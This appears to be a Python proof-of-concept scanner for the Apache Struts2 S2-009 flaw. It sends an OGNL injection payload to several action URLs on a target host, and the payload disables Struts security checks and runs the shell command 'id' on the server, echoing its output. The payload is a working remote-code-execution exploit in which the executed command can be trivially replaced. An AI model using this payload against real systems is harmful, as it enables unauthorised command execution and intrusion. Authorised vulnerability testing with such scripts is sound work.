try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/ajax/example5.action']
        self.queues = queue.Queue()
        if '://' not in url:
            self.ip = url
            for dir in dirs:
                urls = 'http://' + url+":"+port +dir
                self.queues.put(urls)

        self.url = url.strip('/')
    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            try:
                req = requests.get(url + '''?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]''',timeout=3)
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-009 in ' + url)
                    os._exit(1)
            except:
                logging.info("[-] time out")
                os._exit(4)
        logging.info('[-] S2-009 Not Found in ' + url)
        os._exit(2)



if __name__ == '__main__':

    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

